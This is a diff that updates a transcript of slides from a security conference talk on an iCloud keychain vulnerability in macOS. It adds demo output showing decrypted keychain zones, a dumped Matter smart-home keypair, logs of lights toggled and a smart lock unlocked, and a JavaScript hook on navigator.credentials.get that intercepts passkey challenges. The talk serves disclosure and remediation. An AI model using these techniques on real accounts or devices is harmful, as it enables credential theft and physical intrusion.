@@ -14,6 +14,8 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 90.2
 ocr_unreliable_blocks: 0
+vision_verified_pages_changed: 13
+vision_verified_pages: 31
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -34,7 +36,7 @@ Grabbing the Keys to the iCloud Kingdom
 
 ## Slide 2
 
-Jaron   Alex
+Jaron   Alex
 Bradley Radocea
 Keychained Melody
 Grabbing the Keys to the iCloud Kingdom
@@ -69,7 +71,7 @@ Grabbing the Keys to the iCloud Kingdom
 
 - To fully grasp the vulnerability itself, we first have to understand a bit about how the Apple securely syncs your iCloud keychain data.
 
-- • The details here can be considered high level as this is a large topic to jump into.
+- The details here can be considered high level as this is a large topic to jump into.
 
 ## Slide 6
 
@@ -77,9 +79,9 @@ Grabbing the Keys to the iCloud Kingdom
 
 - You are simply logging into the icloud with a username and password. However, in the background, your device is creating what Apple calls a “circle of trust”.
 
-- • This is a well thought out process for allowing end to end encryption of many categories of your iCloud data. The idea here is that the secrets in the iCloud keychain and other services should always be encrypted and should only be readable to the devices inside of this trusted circle.
+- This is a well thought out process for allowing end to end encryption of many categories of your iCloud data. The idea here is that the secrets in the iCloud keychain and other services should always be encrypted and should only be readable to the devices inside of this trusted circle.
 
-- • Taking this a step further. Apple has made it so that these secrets are only in memory and can not be pulled off the disk.
+- Taking this a step further. Apple has made it so that these secrets are only in memory and can not be pulled off the disk.
 
 ## Slide 7
 
@@ -120,7 +122,7 @@ Public Key
 
 - With the addition of a second trusted device into your iCloud (iPhone for example) the process is repeated
 
-- • iPhone generates a private/public key pair
+- iPhone generates a private/public key pair
 
 - The original device that is already a part of the “circle” is used to approve the addition of that new device.
 
@@ -149,6 +151,13 @@ Public Key
 
 ## Slide 13
 
+Top Level Key (TLK)
+Class A
+Sensitive
+Unlock-required
+Class C
+After First Unlock
+
 • Top level keys
 
 - TLKs are an AES key per zone
@@ -169,7 +178,7 @@ T r u s t e d P e e r s
 
 - The vulnerability lies in the details of how the various peer’s are managed locally on a macOS system.
 
-- • Trusted Peers Helper is an XPC service that plays an important role in ensuring that your macBook stays aware of all the other trusted devices in your iCloud.
+- Trusted Peers Helper is an XPC service that plays an important role in ensuring that your macBook stays aware of all the other trusted devices in your iCloud.
 
 ## Slide 15
 
@@ -209,6 +218,35 @@ T r u s t e d P e e r s
 
 ## Slide 19
 
+```text
+TLK UUID: BC3294BB-A592-4B52-9E0B-077D406C2218
+
+=== Unwrapping Keys ===
+Unwrapping classA (ED3BEA3C-0DCC-4CEB-A...) with TLK
+  SUCCESS: 64 bytes
+Unwrapping classC (3CBBC9DF-BADB-4708-A...) with TLK
+  SUCCESS: 64 bytes
+Unwrapping tlk (BC3294BB-A592-4B52-9...) with TLK
+  SUCCESS: 64 bytes
+
+=== Encrypted Items ===
+Found 0 items
+
+=== Summary ===
+Successfully decrypted and parsed: 0
+Failed: 0
+
+=== Done ===
+Decrypted items saved to *_decrypted/ folders
+>>> ls decrypted
+ApplePay          CreditCards       Home              Passwords
+Applications      DevicePairing     LimitedPeersAllowed Photos
+AutoUnlock         Engram            Mail              ProtectedCloudStorage
+Backstop           Groups            Manatee           SecureObjectSync
+Contacts           Health            MFi               WiFi
+>>> cat W
+```
+
 - A demo that shows the keychain decryption proof of concept where all iCloud secrets are decrypted off the local device.
 
 - Not all secrets are abusable without file contents (example: photos)
@@ -216,6 +254,52 @@ T r u s t e d P e e r s
 - Not all zones will have files if the device type wasn’t granted permissions (example: health)
 
 ## Slide 20
+
+```text
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>acct</key>
+	<string>CHIPPlugin.systemCommissioner.nodeopcerts.CA:1</string>
+	<key>agrp</key>
+	<string>com.apple.hap.pairing</string>
+	<key>cdat</key>
+	<date>2026-02-24T19:18:18Z</date>
+	<key>class</key>
+	<string>genp</string>
+	<key>desc</key>
+	<string>A<0xa0>CHIPPlugin Matter keypair is stored here.</string>
+	<key>invi</key>
+	<integer>1</integer>
+	<key>labl</key>
+	<string>A CHIPPlugin Matter Keypair.</string>
+	<key>mdat</key>
+	<date>2026-02-24T19:18:18Z</date>
+	<key>musr</key>
+	<data>
+	</data>
+	<key>pdmn</key>
+	<string>dk</string>
+	<key>sha1</key>
+	<data>
+	37JhUBsph6ZvSpuWqWmBqwYPCtc=
+	</data>
+	<key>svce</key>
+	<string>A CHIPPlugin Matter Keypair.</string>
+	<key>tomb</key>
+	<integer>0</integer>
+	<key>type</key>
+	<integer>1836348530</integer>
+	<key>v_Data</key>
+	<data>
+	dGhpcyBpcyBzb21lIG5vbnNlbnNlIGJhc2U2NC4gSG93IGR1bWIgZG8geW91IHRoaW5rIGkgYW0gZGVmY29uMzQ/Cg==...
+	</data>
+	<key>vwht</key>
+	<string>Home</string>
+</dict>
+</plist>
+```
 
 - Among the secrets decrypted are the Matter root certificate to make smart home requests to other devices on the fabric
 
@@ -231,37 +315,100 @@ A demo video of the lights turning off in a smart home upon using a dumped certi
 
 ## Slide 22
 
-
-> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-Endpoint @ device types:
+• 0x16
+Endpoint 0 device types:
+• 0x16
 Endpoint 1 device types:
-e @x10a
-Endpoint @ device types:
+• 0x10a
+Endpoint 0 device types:
+• 0x16
 Endpoint 1 device types:
-> Treating endpoint 1 as load (light/plug)
-Endpoint ® device types:
-@ Toggled!
-> On/Off state: ON @
-@ Toggled!
-> On/Off state: OFF
-@ Toggled!
-> On/Off state: OFF
-Node @x3a8d5187: Endpoints = [1]
-® Testing toggle on Node @x3a8d5187 endpoint
-Node @x3a8d5187: Endpoints = [1]
-® Testing toggle on Node @x3a8d5187 endpoint
-Node @x3a8d5187: Endpoints = [1]
-® Testing toggle on Node @x3a8d5187 endpoint
-Node @x3a8d5187: Endpoints = [1]
+• 0x10a
+→ Treating endpoint 1 as load (light/plug)
+Endpoint 0 device types:
+• 0x16
+✅ Toggled!
+→ On/Off state: ON 💡
+✅ Toggled!
+→ On/Off state: OFF 🌑
+✅ Toggled!
+→ On/Off state: OFF 🌑
+Node 0x3a8d5187: Endpoints = [1]
+
+🔄 Testing toggle on Node 0x3a8d5187 endpoint
+Node 0x3a8d5187: Endpoints = [1]
+
+🔄 Testing toggle on Node 0x3a8d5187 endpoint
+Node 0x3a8d5187: Endpoints = [1]
+
+🔄 Testing toggle on Node 0x3a8d5187 endpoint
+Node 0x3a8d5187: Endpoints = [1]
 ```
 
 ## Slide 23
 
+```text
+Debug — smart_tinker /tmp/decrypted/home/A80CF273-A37F-4389-B0D1-1D8F37588FF3.plist — 99×31
+
+→ On/Off state: OFF 🌑
+Node 0x1060860e: Endpoints = [1]
+
+🔄 Testing toggle on Node 0x1060860e endpoint 1...
+✅ Toggled!
+→ On/Off state: OFF 🌑
+Endpoint 0 device types:
+• 0x16
+Endpoint 1 device types:
+• 0x10a
+Endpoint 1 device types:
+• 0x10a
+→ Treating endpoint 1 as load (light/plug)
+✅ Toggled!
+→ On/Off state: ON 💡
+Node 0x3a8d5187: Endpoints = [1]
+
+🔄 Testing toggle on Node 0x3a8d5187 endpoint 1...
+Endpoint 0 device types:
+• 0x12
+• 0x16
+Endpoint 1 device types:
+• 0xa
+• 0x11
+Endpoint 1 device types:
+• 0xa
+• 0x11
+→ Treating endpoint 1 as smart lock
+→ Lock state raw value: 1
+✅ Door unlocked!
+```
+
 • A demo video of how this same Matter key can be used to open a smart lock
 
 ## Slide 24
+
+```text
+We're hiring!
+
+Google Maps JavaScript API has been loaded directly without loading=async. This c
+
+google.maps.event.addDomListener() is deprecated, use the standard
+addEventListener() method instead:
+https://developer.mozilla.org/docs/Web/API/EventTarget/addEventListener
+The feature will continue to work and there is no plan to decommission
+it.
+
+const origGet = navigator.credentials.get.bind(navigator.credentials);
+navigator.credentials.get = async function(options) {
+  const jwt = new TextDecoder().decode(options.publicKey.challenge);
+  console.log('JWT:', jwt);
+  // Hold the promise open until we resolve it externally
+  return new Promise((resolve) => {
+    window.resolveCredential = resolve;
+    console.log('Ready — run Python then call window.resolveCredential(
+  });
+};
+```
 
 - A demo video of manually using a passkey that’s been decrypted from the keychain
 
@@ -325,7 +472,8 @@ escrowedSigningSPKI
 peerSigningSPKI
 // public key of the peer's signing key
 escrowedEncryptionSPKI
-// public key of the escrow encryption key peerEncryptionSPKI
+// public key of the escrow encryption key
+peerEncryptionSPKI
 // public key of the peer's encryption key
 contents Secret + Salt
 // encrypted peer private keys
@@ -350,19 +498,22 @@ Symmetric Key
 ## Slide 30
 
 Visibility and Remediation
-The End
-• Visibility
-• By Jaron Bradley and Alex Radocea • otctl status --json
-• •3D Models ckksctl status
-• Fix
-• "cartoon_airplane" by DonikXD, licensed under CC BY 4.0 Source:
-• Apple fsketchfab.com/3dixed the inject logic bug to address the cloud se-models/cartoon-airplane- curity dumping vulnerability
-c5b84f0dff874547a3707005c136b21f
-• Escrow no longer leaks into UID-wrapped bac kups
-• "Apple iMac 27 Retina" by Ren Viro Store, licensed under CC BY 4.0 Source:
-• Reset of encryption (proceed with caution)
-sketchfab.com/3d-models/apple-imac-27-retina-
-• ckksctl cloudkit-reseta6d933f77e9a494e85a4232dbd975b9f
+
+- Visibility
+
+   - otctl status --json
+
+   - ckksctl status
+
+- Fix
+
+   - Apple fixed the inject logic bug to address the cloud security dumping vulnerability
+
+   - Escrow no longer leaks into UID-wrapped backups
+
+- Reset of encryption (proceed with caution)
+
+   - ckksctl cloudkit-reset
 
 - otctl - can be used to learn more about trusted devices that your computer knows about
 
